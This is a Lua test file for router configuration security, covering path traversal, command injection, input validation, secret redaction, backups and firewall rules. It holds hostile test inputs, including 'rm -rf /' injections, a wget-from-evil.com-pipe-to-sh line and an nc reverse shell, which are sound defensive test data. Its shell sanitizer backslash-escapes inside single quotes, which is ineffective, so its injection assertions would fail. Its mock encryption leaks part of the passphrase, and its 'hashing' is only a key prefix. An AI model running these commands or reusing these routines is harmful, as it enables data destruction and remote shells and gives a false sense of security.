-- test_security_scenarios.lua - Integration tests for security edge cases
local TestFramework = require("test_framework")
local test = TestFramework.new("Security Scenarios Tests")

-- Mock environment
local original_io_open = io.open
local original_os_execute = os.execute
local mock_files = {}
local mock_execute_calls = {}

local function mock_io_open(filename, mode)
    if mode == "r" then
        if mock_files[filename] then
            return {
                read = function(self, format)
                    if format == "*a" then
                        return mock_files[filename]
                    end
                end,
                close = function() return true end
            }
        end
        return nil, "Permission denied"
    elseif mode == "w" then
        -- Check write permissions
        if filename:match("^/etc/") and not filename:match("^/etc/config/") then
            return nil, "Permission denied"
        end
        return {
            write = function(self, data)
                mock_files[filename] = data
                return true
            end,
            close = function() return true end
        }
    end
end

-- Test path traversal prevention
test:add("Path traversal prevention", function()
    io.open = mock_io_open
    
    -- Test various path traversal attempts
    local malicious_paths = {
        "/etc/config/../passwd",
        "/etc/config/../../etc/shadow",
        "/etc/config/./../../root/.ssh/id_rsa",
        "/tmp/../etc/passwd",
        "/etc/config/network/../../../etc/passwd"
    }
    
    local safe_paths = {
        "/etc/config/network",
        "/etc/config/wireless",
        "/tmp/uci-backup.conf",
        "/var/run/uci.lock"
    }
    
    -- Function to validate paths
    local function is_safe_path(path)
        -- Normalize path
        local normalized = path:gsub("/+", "/")
        
        -- Check for path traversal
        if normalized:match("%.%.") then
            return false
        end
        
        -- Check allowed directories
        local allowed_prefixes = {
            "^/etc/config/",
            "^/tmp/",
            "^/var/run/"
        }
        
        for _, prefix in ipairs(allowed_prefixes) do
            if normalized:match(prefix) then
                return true
            end
        end
        
        return false
    end
    
    -- Test malicious paths
    for _, path in ipairs(malicious_paths) do
        test:assert_false(is_safe_path(path), path .. " should be blocked")
    end
    
    -- Test safe paths
    for _, path in ipairs(safe_paths) do
        test:assert_true(is_safe_path(path), path .. " should be allowed")
    end
    
    io.open = original_io_open
end)

-- Test command injection prevention
test:add("Command injection prevention", function()
    os.execute = function(cmd)
        table.insert(mock_execute_calls, cmd)
        return true
    end
    
    mock_execute_calls = {}
    
    -- Test various injection attempts
    local malicious_inputs = {
        "'; rm -rf /; echo '",
        "$(rm -rf /)",
        "`rm -rf /`",
        "| rm -rf /",
        "&& rm -rf /",
        "; cat /etc/passwd",
        "'; wget http://evil.com/malware.sh | sh; '"
    }
    
    -- Function to sanitize shell arguments
    local function sanitize_shell_arg(arg)
        -- Escape shell metacharacters
        return arg:gsub("[`$|;&<>(){}%[%]'\"\\]", "\\%1")
    end
    
    -- Test command construction with sanitization
    for _, input in ipairs(malicious_inputs) do
        local safe_input = sanitize_shell_arg(input)
        local cmd = "uci set network.lan.hostname='" .. safe_input .. "'"
        os.execute(cmd)
    end
    
    -- Verify no malicious commands were executed
    for _, cmd in ipairs(mock_execute_calls) do
        test:assert_nil(cmd:match("rm %-rf /"), "Should not contain rm -rf /")
        test:assert_nil(cmd:match("wget.*evil"), "Should not contain wget evil")
        test:assert_nil(cmd:match("cat /etc/passwd"), "Should not contain passwd access")
    end
    
    os.execute = original_os_execute
end)

-- Test privilege escalation prevention
test:add("Privilege escalation prevention", function()
    -- Test UID/permission checks
    local function check_process_privileges()
        local uid = 1000  -- Non-root user
        local euid = 1000  -- Effective UID
        
        -- Operations that should be denied for non-root
        local privileged_operations = {
            {op = "write_system_config", path = "/etc/passwd", allowed = false},
            {op = "bind_privileged_port", port = 80, allowed = false},
            {op = "load_kernel_module", module = "iptables", allowed = false},
            {op = "write_uci_config", path = "/etc/config/network", allowed = true}
        }
        
        local results = {}
        for _, op in ipairs(privileged_operations) do
            if uid == 0 or euid == 0 then
                results[op.op] = true  -- Root can do anything
            else
                results[op.op] = op.allowed  -- Non-root restricted
            end
        end
        
        return results, uid
    end
    
    local privs, uid = check_process_privileges()
    test:assert_false(privs.write_system_config, "Non-root should not write system files")
    test:assert_false(privs.bind_privileged_port, "Non-root should not bind privileged ports")
    test:assert_true(privs.write_uci_config, "Should allow UCI config writes")
end)

-- Test input validation and sanitization
test:add("Input validation and sanitization", function()
    -- Test various input validation scenarios
    local validation_tests = {
        -- IP address validation
        {
            type = "ip_address",
            valid = {"192.168.1.1", "10.0.0.1", "172.16.0.1", "255.255.255.255"},
            invalid = {"192.168.1.256", "192.168.1", "192.168.1.1.1", "192.168.-1.1",
                      "'; drop table users; --", "$(whoami)"}
        },
        -- Port number validation
        {
            type = "port",
            valid = {"22", "80", "443", "8080", "65535"},
            invalid = {"0", "65536", "http", "-1", "22; nc -e /bin/sh 10.0.0.1 4444"}
        },
        -- Interface name validation
        {
            type = "interface",
            valid = {"eth0", "wlan0", "br-lan", "eth0.1", "wg0"},
            invalid = {"eth0; rm -rf /", "../../../etc/passwd", "eth0$(id)", "eth0`whoami`"}
        }
    }
    
    -- Validation functions
    local validators = {
        ip_address = function(ip)
            if not ip:match("^%d+%.%d+%.%d+%.%d+$") then return false end
            for octet in ip:gmatch("(%d+)") do
                local num = tonumber(octet)
                if not num or num < 0 or num > 255 then return false end
            end
            return true
        end,
        port = function(port)
            local num = tonumber(port)
            return num and num > 0 and num <= 65535
        end,
        interface = function(iface)
            return iface:match("^[a-zA-Z][a-zA-Z0-9%-%._]*$") ~= nil
        end
    }
    
    -- Run validation tests
    for _, test_set in ipairs(validation_tests) do
        local validator = validators[test_set.type]
        
        for _, valid_input in ipairs(test_set.valid) do
            test:assert_true(validator(valid_input), 
                test_set.type .. ": " .. valid_input .. " should be valid")
        end
        
        for _, invalid_input in ipairs(test_set.invalid) do
            test:assert_false(validator(invalid_input), 
                test_set.type .. ": " .. invalid_input .. " should be invalid")
        end
    end
end)

-- Test file permission security
test:add("File permission security", function()
    os.execute = function(cmd)
        table.insert(mock_execute_calls, cmd)
        -- Simulate chmod/chown commands
        if cmd:match("chmod 600") or cmd:match("chmod 644") then
            return true
        end
        return false
    end
    
    mock_execute_calls = {}
    
    -- Files that need specific permissions
    local permission_requirements = {
        {file = "/etc/config/wireless", mode = "644", reason = "UCI configs readable"},
        {file = "/etc/dropbear/authorized_keys", mode = "600", reason = "SSH keys restricted"},
        {file = "/tmp/uci-backup.conf", mode = "600", reason = "Backups restricted"},
        {file = "/var/run/uci.lock", mode = "644", reason = "Lock files readable"}
    }
    
    -- Set permissions
    for _, req in ipairs(permission_requirements) do
        os.execute("chmod " .. req.mode .. " " .. req.file)
    end
    
    -- Verify correct permissions were set
    for _, req in ipairs(permission_requirements) do
        local found = false
        for _, cmd in ipairs(mock_execute_calls) do
            if cmd:match("chmod " .. req.mode .. " " .. req.file) then
                found = true
                break
            end
        end
        test:assert_true(found, req.file .. " should have mode " .. req.mode)
    end
    
    os.execute = original_os_execute
end)

-- Test secure configuration handling
test:add("Secure configuration handling", function()
    io.open = mock_io_open
    
    -- Sensitive configuration patterns
    local sensitive_patterns = {
        password = "password%s*=%s*['\"]([^'\"]+)['\"]",
        key = "key%s*=%s*['\"]([^'\"]+)['\"]",
        secret = "secret%s*=%s*['\"]([^'\"]+)['\"]",
        token = "token%s*=%s*['\"]([^'\"]+)['\"]"
    }
    
    -- Test configuration with sensitive data
    mock_files["/etc/config/wireless"] = [[
config wifi-iface 'default_radio0'
    option device 'radio0'
    option network 'lan'
    option mode 'ap'
    option ssid 'TestNetwork'
    option encryption 'psk2'
    option key 'SuperSecretPassword123'
]]
    
    -- Function to redact sensitive data
    local function redact_sensitive_data(config)
        local redacted = config
        for name, pattern in pairs(sensitive_patterns) do
            redacted = redacted:gsub(pattern, name .. "='***REDACTED***'")
        end
        return redacted
    end
    
    -- Test redaction
    local original = mock_files["/etc/config/wireless"]
    local redacted = redact_sensitive_data(original)
    
    test:assert_nil(redacted:match("SuperSecretPassword123"), "Password should be redacted")
    test:assert_match(redacted, "REDACTED", "Should contain redaction marker")
    test:assert_match(redacted, "option ssid 'TestNetwork'", "Non-sensitive data preserved")
    
    io.open = original_io_open
end)

-- Test backup encryption
test:add("Backup encryption security", function()
    -- Test encryption of sensitive backups
    local function encrypt_backup(data, passphrase)
        -- Simulate encryption (in real implementation would use openssl or similar)
        local encrypted = "ENCRYPTED:" .. #data .. ":" .. passphrase:sub(1, 4)
        return encrypted
    end
    
    local function decrypt_backup(encrypted_data, passphrase)
        if encrypted_data:match("^ENCRYPTED:") then
            local size = encrypted_data:match("ENCRYPTED:(%d+):")
            -- Verify passphrase hint (first 4 chars)
            if encrypted_data:match(":" .. passphrase:sub(1, 4) .. "$") then
                return true, tonumber(size)
            end
        end
        return false, "Invalid passphrase"
    end
    
    -- Test backup encryption
    local sensitive_config = "network.lan.key='SecretKey123'"
    local passphrase = "BackupPass123"
    
    local encrypted = encrypt_backup(sensitive_config, passphrase)
    test:assert_match(encrypted, "^ENCRYPTED:", "Should be marked as encrypted")
    test:assert_nil(encrypted:match("SecretKey123"), "Should not contain plaintext")
    
    -- Test decryption
    local success, size = decrypt_backup(encrypted, passphrase)
    test:assert_true(success, "Should decrypt with correct passphrase")
    test:assert_equal(size, #sensitive_config, "Should recover correct size")
    
    -- Test wrong passphrase
    success = decrypt_backup(encrypted, "WrongPass")
    test:assert_false(success, "Should fail with wrong passphrase")
end)

-- Test network isolation during deployment
test:add("Network isolation security", function()
    os.execute = function(cmd)
        table.insert(mock_execute_calls, cmd)
        return true
    end
    
    mock_execute_calls = {}
    
    -- Firewall rules for deployment isolation
    local isolation_rules = {
        -- Block outbound during critical operations
        "iptables -I OUTPUT -j DROP",
        -- Allow only SSH from management network
        "iptables -I INPUT -p tcp --dport 22 -s 10.0.0.0/24 -j ACCEPT",
        "iptables -I INPUT -p tcp --dport 22 -j DROP",
        -- Allow localhost
        "iptables -I INPUT -i lo -j ACCEPT",
        -- Default deny
        "iptables -P INPUT DROP"
    }
    
    -- Apply isolation rules
    for _, rule in ipairs(isolation_rules) do
        os.execute(rule)
    end
    
    -- Verify rules were applied
    local has_output_block = false
    local has_ssh_restrict = false
    
    for _, cmd in ipairs(mock_execute_calls) do
        if cmd:match("OUTPUT %-j DROP") then has_output_block = true end
        if cmd:match("dport 22 %-s 10%.0%.0%.0") then has_ssh_restrict = true end
    end
    
    test:assert_true(has_output_block, "Should block outbound traffic")
    test:assert_true(has_ssh_restrict, "Should restrict SSH access")
    
    os.execute = original_os_execute
end)

-- Test secure secret storage
test:add("Secure secret storage", function()
    io.open = mock_io_open
    
    -- Test secure storage of credentials
    local secret_storage = {
        secrets = {},
        
        store = function(self, key, value)
            -- Hash the key for storage
            local hashed_key = "SHA256:" .. key:sub(1, 8)
            -- Encrypt value (simulated)
            local encrypted_value = "ENC:" .. #value
            self.secrets[hashed_key] = {
                value = encrypted_value,
                timestamp = os.time(),
                access_count = 0
            }
        end,
        
        retrieve = function(self, key)
            local hashed_key = "SHA256:" .. key:sub(1, 8)
            local entry = self.secrets[hashed_key]
            if entry then
                entry.access_count = entry.access_count + 1
                -- Check access frequency (rate limiting)
                if entry.access_count > 10 then
                    return nil, "Rate limit exceeded"
                end
                return entry.value
            end
            return nil, "Not found"
        end
    }
    
    -- Test storage
    secret_storage:store("wifi_password", "MySecretWiFiPass")
    secret_storage:store("api_token", "Bearer abc123xyz")
    
    -- Test retrieval
    local wifi_pass = secret_storage:retrieve("wifi_password")
    test:assert_match(wifi_pass, "^ENC:", "Should return encrypted value")
    
    -- Test rate limiting
    for i = 1, 11 do
        secret_storage:retrieve("api_token")
    end
    local token, err = secret_storage:retrieve("api_token")
    test:assert_nil(token, "Should be rate limited")
    test:assert_match(err, "Rate limit", "Should indicate rate limit")
    
    io.open = original_io_open
end)

-- Test audit logging
test:add("Security audit logging", function()
    -- Audit log for security events
    local audit_log = {
        events = {},
        
        log = function(self, event_type, details)
            table.insert(self.events, {
                timestamp = os.time(),
                type = event_type,
                details = details,
                pid = "12345",  -- Mock PID
                user = "admin"  -- Mock user
            })
        end,
        
        get_suspicious_events = function(self)
            local suspicious = {}
            for _, event in ipairs(self.events) do
                if event.type == "auth_failure" or 
                   event.type == "privilege_escalation" or
                   event.type == "path_traversal" then
                    table.insert(suspicious, event)
                end
            end
            return suspicious
        end
    }
    
    -- Log various security events
    audit_log:log("auth_success", {user = "admin", ip = "192.168.1.100"})
    audit_log:log("config_change", {file = "/etc/config/network"})
    audit_log:log("auth_failure", {user = "root", ip = "10.0.0.99", reason = "bad password"})
    audit_log:log("path_traversal", {path = "/etc/config/../passwd", blocked = true})
    audit_log:log("privilege_escalation", {user = "nobody", attempted = "write_system"})
    
    -- Check suspicious events
    local suspicious = audit_log:get_suspicious_events()
    test:assert_equal(#suspicious, 3, "Should detect 3 suspicious events")
    
    -- Verify event details
    local has_auth_failure = false
    local has_path_traversal = false
    
    for _, event in ipairs(suspicious) do
        if event.type == "auth_failure" then has_auth_failure = true end
        if event.type == "path_traversal" then has_path_traversal = true end
    end
    
    test:assert_true(has_auth_failure, "Should log auth failures")
    test:assert_true(has_path_traversal, "Should log path traversal attempts")
end)

-- Run all tests
test:run()